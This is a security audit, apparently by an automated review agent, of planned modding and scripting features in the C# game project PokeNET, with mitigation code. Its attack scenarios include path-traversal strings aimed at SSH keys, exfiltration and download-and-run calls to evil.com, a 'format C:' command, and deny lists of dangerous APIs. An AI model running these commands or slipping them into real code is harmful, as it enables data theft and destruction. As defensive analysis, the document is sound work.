# Security Audit Review - PokeNET

**Review Date:** 2025-10-22
**Reviewer:** Code Review Agent
**Scope:** Security considerations for modding framework, asset loading, scripting

## Executive Summary

**Overall Security Rating:** 🟡 **INCOMPLETE**

The project is in early development with no security-sensitive features implemented yet. However, based on the GAME_FRAMEWORK_PLAN.md, the planned features present significant security challenges that must be addressed.

**Current Vulnerabilities:** 0 (nothing implemented yet)
**Future Risk Areas:** 8 (based on planned features)
**Security Controls Missing:** 12

---

## 1. Current Codebase Security Analysis

### ✅ SAFE: Current Implementation

The existing code has minimal attack surface:

**PokeNETGame.cs:**
- No user input handling
- No file system access (except MonoGame content)
- No network operations
- No external data loading

**LocalizationManager.cs:**
- Only accesses embedded resources (safe)
- No file system traversal
- Validates culture code (basic validation)

**Platform Entry Points:**
- Simple game instantiation
- No command-line argument processing
- No external configuration loading

**Rating:** ✅ Current code is secure (but minimal)

---

## 2. Phase 3: Asset Management Security Risks

### 🔴 CRITICAL: Path Traversal Vulnerability Risk

**Planned Feature (Phase 3):**
> "Asset manager will search for assets in mod directories, then fallback to base game assets"

**Vulnerability:** Directory/Path Traversal Attack

**Attack Scenario:**
```csharp
// Malicious mod includes asset path:
"../../../Windows/System32/config.ini"
"..\\..\\..\\Users\\Administrator\\.ssh\\id_rsa"

// Without validation, asset loader could access:
assetManager.Load("../../../../etc/passwd");
assetManager.Load("../../../sensitive_data.db");
```

**Impact:** **CRITICAL**
- Read arbitrary files on user's system
- Exfiltrate sensitive data
- Modify game files outside mod sandbox

**Mitigation Required:**

```csharp
public interface IAssetLoader<T>
{
    T Load(string path);
}

public class SecureAssetLoader<T> : IAssetLoader<T>
{
    private readonly ILogger<SecureAssetLoader<T>> _logger;
    private readonly string[] _allowedBasePaths;

    public T Load(string path)
    {
        // 1. Validate path format
        if (string.IsNullOrWhiteSpace(path))
            throw new ArgumentException("Path cannot be empty", nameof(path));

        // 2. Block path traversal attempts
        if (path.Contains(".."))
        {
            _logger.LogWarning("Path traversal attempt blocked: {Path}", path);
            throw new SecurityException($"Path traversal not allowed: {path}");
        }

        // 3. Normalize path
        string normalizedPath = Path.GetFullPath(path);

        // 4. Ensure path is within allowed directories
        bool isAllowed = _allowedBasePaths.Any(basePath =>
            normalizedPath.StartsWith(
                Path.GetFullPath(basePath),
                StringComparison.OrdinalIgnoreCase));

        if (!isAllowed)
        {
            _logger.LogWarning("Attempted access outside allowed paths: {Path}", normalizedPath);
            throw new SecurityException($"Path not in allowed directories: {path}");
        }

        // 5. Check file exists before attempting load
        if (!File.Exists(normalizedPath))
            throw new FileNotFoundException($"Asset not found: {path}");

        // 6. Log all asset loads for audit trail
        _logger.LogInformation("Loading asset: {Path}", normalizedPath);

        return LoadAssetInternal(normalizedPath);
    }
}
```

**Additional Protections:**

```csharp
// Configuration class
public class AssetSecurityConfiguration
{
    public string[] AllowedBasePaths { get; set; } = new[]
    {
        "Content/",
        "Mods/",
        "Data/"
    };

    public string[] BlockedExtensions { get; set; } = new[]
    {
        ".exe", ".dll", ".so", ".dylib",
        ".bat", ".sh", ".ps1", ".cmd"
    };

    public long MaxAssetSizeBytes { get; set; } = 100 * 1024 * 1024; // 100 MB

    public bool ValidatePath(string path)
    {
        // No path traversal
        if (path.Contains("..") || path.Contains("~"))
            return false;

        // No absolute paths from mods
        if (Path.IsPathRooted(path))
            return false;

        // Block dangerous extensions
        string extension = Path.GetExtension(path);
        if (BlockedExtensions.Contains(extension, StringComparer.OrdinalIgnoreCase))
            return false;

        return true;
    }
}
```

---

## 3. Phase 4: Mod Loading Security Risks

### 🔴 CRITICAL: Arbitrary Code Execution

**Planned Feature (Phase 4):**
> "ModLoader will load .dll files from mods and execute a designated entry point"

**Vulnerability:** Remote Code Execution (RCE)

**Attack Scenarios:**

1. **Malicious Mod DLL:**
```csharp
// Malicious mod code
public class EvilMod : IMod
{
    public void Initialize()
    {
        // Delete user files
        File.Delete("C:\\Users\\*\\Documents\\*");

        // Exfiltrate data
        SendDataToAttacker(File.ReadAllText("save_game.json"));

        // Install malware
        DownloadAndExecute("http://evil.com/malware.exe");

        // Cryptolocker
        EncryptAllUserFiles();
    }
}
```

2. **Reflection Abuse:**
```csharp
// Bypass security via reflection
Assembly.Load("System.Management")
    .GetType("System.Management.ManagementClass")
    .GetMethod("InvokeMethod")
    .Invoke(null, new[] { "Win32_Process", "Create", "cmd.exe /c malware.exe" });
```

**Impact:** **CRITICAL**
- Complete system compromise
- Data theft
- Ransomware installation
- Privacy violations

**Mitigations Required:**

#### A. Mod Sandboxing via AssemblyLoadContext

```csharp
public class SandboxedModLoader : IModLoader
{
    private readonly ILogger<SandboxedModLoader> _logger;
    private readonly ModSecurityPolicy _securityPolicy;

    public void LoadMod(string modPath)
    {
        // 1. Create isolated AssemblyLoadContext
        var context = new ModAssemblyLoadContext(modPath, isCollectible: true);

        try
        {
            // 2. Load mod assembly in isolated context
            Assembly modAssembly = context.LoadFromAssemblyPath(modPath);

            // 3. Verify mod signature (optional but recommended)
            if (_securityPolicy.RequireSignedMods && !VerifySignature(modAssembly))
            {
                _logger.LogWarning("Unsigned mod rejected: {ModPath}", modPath);
                throw new SecurityException("Mod must be digitally signed");
            }

            // 4. Check for dangerous dependencies
            var dependencies = modAssembly.GetReferencedAssemblies();
            var dangerous = dependencies.Where(d =>
                d.Name == "System.Management" ||
                d.Name == "System.Diagnostics.Process" ||
                d.Name == "System.Net.Http");

            if (dangerous.Any())
            {
                _logger.LogWarning("Mod uses dangerous APIs: {ModPath}, {Dependencies}",
                    modPath, string.Join(", ", dangerous.Select(d => d.Name)));

                if (!_securityPolicy.AllowDangerousApis)
                    throw new SecurityException("Mod uses restricted APIs");
            }

            // 5. Load mod through restricted interface
            var modType = FindModEntryPoint(modAssembly);
            var mod = (IMod)Activator.CreateInstance(modType);

            // 6. Execute in restricted context
            ExecuteModInSandbox(mod);
        }
        finally
        {
            // Unload context when done (if collectible)
            context.Unload();
        }
    }

    private void ExecuteModInSandbox(IMod mod)
    {
        // Set security context
        using (new ModSecurityContext(_securityPolicy))
        {
            try
            {
                // Execute with timeout
                var cts = new CancellationTokenSource(TimeSpan.FromSeconds(30));
                Task.Run(() => mod.Initialize(), cts.Token).Wait();
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Mod initialization failed");
                throw;
            }
        }
    }
}

// Isolated load context
public class ModAssemblyLoadContext : AssemblyLoadContext
{
    private readonly AssemblyDependencyResolver _resolver;

    public ModAssemblyLoadContext(string pluginPath, bool isCollectible)
        : base(isCollectible: isCollectible)
    {
        _resolver = new AssemblyDependencyResolver(pluginPath);
    }

    protected override Assembly Load(AssemblyName assemblyName)
    {
        // Block dangerous assemblies
        if (IsRestrictedAssembly(assemblyName.Name))
            return null;

        string assemblyPath = _resolver.ResolveAssemblyToPath(assemblyName);
        if (assemblyPath != null)
            return LoadFromAssemblyPath(assemblyPath);

        return null;
    }

    private bool IsRestrictedAssembly(string name)
    {
        string[] restricted = new[]
        {
            "System.Management",
            "System.Diagnostics.Process",
            // Add more as needed
        };

        return restricted.Contains(name);
    }
}
```

#### B. Mod API Capability-Based Security

```csharp
// Expose minimal, capability-based API to mods
public interface IModApi
{
    // Safe operations only
    void RegisterItem(ItemDefinition item);
    void RegisterCreature(CreatureDefinition creature);
    void RegisterMove(MoveDefinition move);
    void SubscribeToEvent<TEvent>(Action<TEvent> handler);

    // NO access to:
    // - File system (except through IAssetLoader)
    // - Network (no HttpClient)
    // - Process creation
    // - Reflection on game code
}

// Mods can only access IModApi, not full game internals
public interface IMod
{
    void Initialize(IModApi api);  // Only receives limited API
}
```

#### C. Mod Trust Levels

```csharp
public enum ModTrustLevel
{
    Untrusted,      // Default, maximum restrictions
    Verified,       // From known sources, some restrictions lifted
    Trusted,        // Signed by developer, fewer restrictions
    Development     // Full access (for mod development only)
}

public class ModSecurityPolicy
{
    public ModTrustLevel DefaultTrustLevel { get; set; } = ModTrustLevel.Untrusted;
    public bool RequireSignedMods { get; set; } = false;
    public bool AllowDangerousApis { get; set; } = false;
    public bool ShowSecurityWarnings { get; set; } = true;

    public Dictionary<ModTrustLevel, Permissions> TrustLevelPermissions { get; set; } = new()
    {
        [ModTrustLevel.Untrusted] = new Permissions
        {
            CanAccessFileSystem = false,
            CanAccessNetwork = false,
            CanUseReflection = false,
            MaxExecutionTime = TimeSpan.FromSeconds(5),
            MaxMemoryMB = 50
        },
        [ModTrustLevel.Verified] = new Permissions
        {
            CanAccessFileSystem = true,  // Limited to mod directory
            CanAccessNetwork = false,
            CanUseReflection = true,     // Limited to mod assemblies
            MaxExecutionTime = TimeSpan.FromSeconds(30),
            MaxMemoryMB = 200
        },
        [ModTrustLevel.Trusted] = new Permissions
        {
            CanAccessFileSystem = true,
            CanAccessNetwork = true,     // With user consent
            CanUseReflection = true,
            MaxExecutionTime = TimeSpan.FromMinutes(5),
            MaxMemoryMB = 500
        }
    };
}
```

---

## 4. Phase 5: Roslyn Scripting Security

### 🔴 CRITICAL: Script Injection & Code Execution

**Planned Feature (Phase 5):**
> "ScriptingEngine loads and executes C# script files (.cs/.csx)"

**Vulnerabilities:**
1. Arbitrary code execution
2. Script injection attacks
3. Access to sensitive APIs

**Attack Scenarios:**

```csharp
// Malicious script in mod
// Mods/EvilMod/Scripts/move_effect.csx

// Delete save files
Directory.Delete("Saves/", recursive: true);

// Exfiltrate player data
HttpClient client = new HttpClient();
await client.PostAsync("http://evil.com/collect",
    new StringContent(File.ReadAllText("player_data.json")));

// Execute shell commands
Process.Start("cmd.exe", "/c format C:");
```

**Mitigations Required:**

```csharp
public class SecureScriptingEngine : IScriptingEngine
{
    private readonly ILogger<SecureScriptingEngine> _logger;
    private readonly ScriptingSecurityPolicy _policy;

    public async Task<T> ExecuteScriptAsync<T>(string scriptPath)
    {
        // 1. Read script
        string scriptCode = await File.ReadAllTextAsync(scriptPath);

        // 2. Static analysis for dangerous patterns
        if (ContainsDangerousCode(scriptCode))
        {
            _logger.LogWarning("Script contains dangerous code: {Path}", scriptPath);
            throw new SecurityException("Script uses restricted APIs");
        }

        // 3. Create restricted scripting options
        var options = ScriptOptions.Default
            .WithReferences(typeof(object).Assembly)  // Only safe assemblies
            .WithImports(
                "System",
                "System.Collections.Generic",
                "System.Linq")  // Only safe namespaces
            .WithAllowUnsafe(false);  // No unsafe code

        // 4. Compile script
        var script = CSharpScript.Create<T>(scriptCode, options);
        var compilation = script.GetCompilation();

        // 5. Check for compilation errors
        var diagnostics = compilation.GetDiagnostics();
        if (diagnostics.Any(d => d.Severity == DiagnosticSeverity.Error))
            throw new ScriptCompilationException("Script has errors", diagnostics);

        // 6. Execute with timeout
        using var cts = new CancellationTokenSource(_policy.MaxExecutionTime);
        try
        {
            var result = await script.RunAsync(cancellationToken: cts.Token);
            return result.ReturnValue;
        }
        catch (OperationCanceledException)
        {
            _logger.LogWarning("Script execution timeout: {Path}", scriptPath);
            throw new TimeoutException("Script execution exceeded time limit");
        }
    }

    private bool ContainsDangerousCode(string code)
    {
        string[] dangerousPatterns = new[]
        {
            "System.IO.File",
            "System.IO.Directory",
            "System.Net.Http.HttpClient",
            "System.Diagnostics.Process",
            "System.Reflection.Assembly",
            "DllImport",
            "unsafe",
            "Process.Start",
            "Environment.Exit"
        };

        return dangerousPatterns.Any(pattern =>
            code.Contains(pattern, StringComparison.OrdinalIgnoreCase));
    }
}

public class ScriptingSecurityPolicy
{
    public TimeSpan MaxExecutionTime { get; set; } = TimeSpan.FromSeconds(10);
    public string[] AllowedNamespaces { get; set; } = new[]
    {
        "System",
        "System.Linq",
        "System.Collections.Generic"
    };
    public bool AllowFileAccess { get; set; } = false;
    public bool AllowNetworkAccess { get; set; } = false;
}
```

**Whitelist API Approach:**

```csharp
// Expose safe scripting API
public class ScriptingApi
{
    private readonly World _world;
    private readonly ILogger _logger;

    // Safe operations only
    public void SpawnEntity(string prefab) { }
    public void DealDamage(EntityId target, int amount) { }
    public void ApplyStatus(EntityId target, StatusEffect effect) { }
    public int GetStat(EntityId entity, string statName) { }

    // NO access to:
    // - File system
    // - Network
    // - Process creation
    // - Game state mutation outside API
}

// Scripts can only access ScriptingApi
var scriptGlobals = new ScriptGlobals
{
    Api = new ScriptingApi(world, logger)
};

var script = CSharpScript.Create(code, globals: scriptGlobals);
```

---

## 5. Phase 4: Harmony Patching Security

### 🔴 CRITICAL: Runtime Code Modification

**Planned Feature (Phase 4):**
> "Lib.Harmony to patch game code at runtime"

**Vulnerability:** Unrestricted code patching = complete control

**Attack Scenarios:**

```csharp
// Malicious Harmony patch
[HarmonyPatch(typeof(SaveGameManager), "SaveGame")]
class MaliciousPatch
{
    static bool Prefix(SaveGame save)
    {
        // Steal save data
        SendToAttacker(save);

        // Corrupt save
        save.PlayerGold = 0;
        save.Inventory.Clear();

        return true;  // Continue to original method
    }
}

// Patch authentication
[HarmonyPatch(typeof(ModVerifier), "IsModSafe")]
class BypassSecurity
{
    static bool Prefix(ref bool __result)
    {
        __result = true;  // Always return "safe"
        return false;     // Skip original method
    }
}
```

**Impact:** **CRITICAL**
- Complete bypass of all security measures
- Arbitrary code modification
- No safe way to sandbox Harmony

**Mitigations:**

```csharp
public class HarmonySecurityManager
{
    private readonly ILogger<HarmonySecurityManager> _logger;
    private readonly Harmony _harmony;
    private readonly HashSet<Type> _protectedTypes;

    public HarmonySecurityManager()
    {
        _protectedTypes = new HashSet<Type>
        {
            typeof(ModLoader),
            typeof(ModSecurityPolicy),
            typeof(AssetLoader),
            typeof(SaveGameManager),
            // Add all security-critical types
        };
    }

    public void ApplyModPatches(ModInfo mod)
    {
        // 1. Get all harmony patches from mod
        var patchMethods = GetHarmonyPatches(mod.Assembly);

        // 2. Validate each patch
        foreach (var patch in patchMethods)
        {
            var targetMethod = GetPatchTarget(patch);

            // 3. Block patches to protected types
            if (_protectedTypes.Contains(targetMethod.DeclaringType))
            {
                _logger.LogWarning(
                    "Mod {ModName} attempted to patch protected type {Type}",
                    mod.Name, targetMethod.DeclaringType.Name);

                throw new SecurityException(
                    $"Cannot patch protected type: {targetMethod.DeclaringType.Name}");
            }

            // 4. Log all patches for audit
            _logger.LogInformation(
                "Applying patch from {ModName} to {Type}.{Method}",
                mod.Name, targetMethod.DeclaringType.Name, targetMethod.Name);
        }

        // 5. Apply patches
        _harmony.PatchAll(mod.Assembly);
    }
}
```

**Best Practice:**
```csharp
// Provide safe extension points instead of allowing arbitrary Harmony patches

public interface IGameplayExtension
{
    void OnEntityCreated(Entity entity);
    void OnDamageCalculated(ref int damage, Entity attacker, Entity target);
    void OnItemUsed(Item item, Entity user);
}

// Let mods implement interfaces instead of patching
public class ModExtensionManager
{
    private readonly List<IGameplayExtension> _extensions = new();

    public void RegisterExtension(IGameplayExtension extension)
    {
        _extensions.Add(extension);
    }

    public void NotifyEntityCreated(Entity entity)
    {
        foreach (var ext in _extensions)
        {
            try
            {
                ext.OnEntityCreated(entity);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Extension error");
            }
        }
    }
}
```

---

## 6. Additional Security Considerations

### A. Resource Limits

```csharp
public class ModResourceLimits
{
    public long MaxMemoryBytes { get; set; } = 100 * 1024 * 1024;  // 100 MB
    public TimeSpan MaxExecutionTime { get; set; } = TimeSpan.FromSeconds(30);
    public int MaxThreads { get; set} = 2;
    public long MaxAssetSizeBytes { get; set; } = 50 * 1024 * 1024;  // 50 MB
}

public class ResourceMonitor
{
    public void EnforceModLimits(ModInfo mod)
    {
        // Monitor memory usage
        long memoryUsage = GetModMemoryUsage(mod);
        if (memoryUsage > _limits.MaxMemoryBytes)
        {
            _logger.LogWarning("Mod {ModName} exceeded memory limit", mod.Name);
            UnloadMod(mod);
        }

        // Monitor execution time
        // Monitor thread creation
        // etc.
    }
}
```

### B. Input Validation

```csharp
public class ModDataValidator
{
    public void ValidateModManifest(ModManifest manifest)
    {
        // Validate name (no path traversal)
        if (manifest.Name.Contains("..") || manifest.Name.Contains("/"))
            throw new ValidationException("Invalid mod name");

        // Validate version
        if (!Version.TryParse(manifest.Version, out _))
            throw new ValidationException("Invalid version format");

        // Validate dependencies
        foreach (var dep in manifest.Dependencies)
        {
            if (string.IsNullOrWhiteSpace(dep.ModId))
                throw new ValidationException("Invalid dependency");
        }

        // Validate file references
        foreach (var file in manifest.Files)
        {
            if (!IsValidPath(file))
                throw new ValidationException($"Invalid file path: {file}");
        }
    }

    private bool IsValidPath(string path)
    {
        // No path traversal
        if (path.Contains("..")) return false;

        // No absolute paths
        if (Path.IsPathRooted(path)) return false;

        // No special characters
        char[] invalidChars = Path.GetInvalidPathChars();
        if (path.Any(c => invalidChars.Contains(c))) return false;

        return true;
    }
}
```

### C. Logging & Monitoring

```csharp
public class SecurityAuditLogger
{
    private readonly ILogger<SecurityAuditLogger> _logger;

    public void LogModLoad(ModInfo mod, bool success)
    {
        _logger.LogInformation(
            "Mod load {Status}: {ModName} v{Version} by {Author}",
            success ? "SUCCESS" : "FAILED",
            mod.Name, mod.Version, mod.Author);
    }

    public void LogSecurityViolation(string modName, string violation)
    {
        _logger.LogWarning(
            "Security violation by mod {ModName}: {Violation}",
            modName, violation);
    }

    public void LogAssetAccess(string modName, string assetPath)
    {
        _logger.LogDebug(
            "Mod {ModName} accessed asset: {AssetPath}",
            modName, assetPath);
    }

    public void LogHarmonyPatch(string modName, string targetMethod)
    {
        _logger.LogInformation(
            "Mod {ModName} patched method: {Method}",
            modName, targetMethod);
    }
}
```

---

## 7. Security Checklist for Implementation

### Phase 3: Asset Management
- [ ] Implement path validation (no traversal)
- [ ] Whitelist allowed base directories
- [ ] Blacklist dangerous file extensions
- [ ] Enforce file size limits
- [ ] Log all asset access
- [ ] Validate asset integrity (checksums)

### Phase 4: Mod Loading
- [ ] Use AssemblyLoadContext for isolation
- [ ] Implement mod signature verification
- [ ] Create capability-based mod API
- [ ] Implement trust levels
- [ ] Add user warnings for untrusted mods
- [ ] Protect critical game types from Harmony patches
- [ ] Log all mod operations
- [ ] Enforce resource limits (memory, CPU, threads)

### Phase 5: Scripting Engine
- [ ] Sandbox script execution
- [ ] Whitelist allowed namespaces
- [ ] Block dangerous APIs (File, Process, etc.)
- [ ] Static code analysis for dangerous patterns
- [ ] Execute with timeout
- [ ] Provide safe scripting API only
- [ ] Log script compilation/execution

### General
- [ ] Implement security audit logging
- [ ] Add user consent UI for dangerous mod operations
- [ ] Create mod security documentation
- [ ] Add mod blacklist/whitelist functionality
- [ ] Implement automatic mod updates with security checks
- [ ] Create security incident response plan

---

## 8. Recommendations

### CRITICAL Priority

1. **Design Security Architecture First**
   - Security must be designed in, not added later
   - Review GAME_FRAMEWORK_PLAN.md Phase 14 (Security)
   - Implement security before mod loading (Phase 4)

2. **Never Trust Mod Code**
   - Assume all mods are malicious
   - Implement defense in depth
   - Provide minimal API surface

3. **Path Traversal Protection**
   - Validate all file paths
   - Use whitelisted directories only
   - Never allow ".." in paths

### HIGH Priority

4. **Mod Sandboxing**
   - Use AssemblyLoadContext
   - Restrict API access
   - Enforce resource limits

5. **Script Sandboxing**
   - Whitelist namespaces
   - Block dangerous APIs
   - Execute with timeouts

6. **User Warning System**
   - Show clear warnings for untrusted mods
   - Require explicit consent
   - Explain risks

### MEDIUM Priority

7. **Mod Signing**
   - Implement code signing for trusted mods
   - Verify signatures before loading
   - Maintain trusted mod registry

8. **Security Logging**
   - Log all security-relevant events
   - Create audit trail
   - Alert on suspicious behavior

---

## 9. Security Threat Model

| Threat | Impact | Likelihood | Mitigation Priority |
|--------|--------|------------|-------------------|
| Path Traversal | HIGH | HIGH | CRITICAL |
| Arbitrary Code Execution (Mods) | CRITICAL | HIGH | CRITICAL |
| Arbitrary Code Execution (Scripts) | CRITICAL | MEDIUM | CRITICAL |
| Harmony Patch Abuse | CRITICAL | MEDIUM | HIGH |
| Resource Exhaustion | MEDIUM | HIGH | HIGH |
| Data Exfiltration | HIGH | MEDIUM | HIGH |
| Save File Corruption | MEDIUM | MEDIUM | MEDIUM |
| Mod Dependency Confusion | MEDIUM | LOW | MEDIUM |
| DLL Hijacking | HIGH | LOW | MEDIUM |

---

## Conclusion

The PokeNET project plans to implement powerful modding features (DLL loading, Harmony patching, Roslyn scripting) that present **CRITICAL security risks**.

**Current Status:** No security vulnerabilities (nothing implemented yet)

**Future Risk:** **CRITICAL** - Without proper security measures, the modding system will allow complete system compromise.

**Recommendations:**
1. Implement security architecture BEFORE Phase 4 (Mod Loading)
2. Review and expand Phase 14 (Security) in the plan
3. Consider reducing attack surface:
   - Data-only mods (safest)
   - Scripting API with whitelist (medium risk)
   - DLL mods with sandboxing (high risk)
   - Unrestricted Harmony patches (critical risk - avoid if possible)

**Key Principle:** **Minimize attack surface, maximize isolation.**

The more powerful the modding system, the higher the security risk. Balance features with safety.
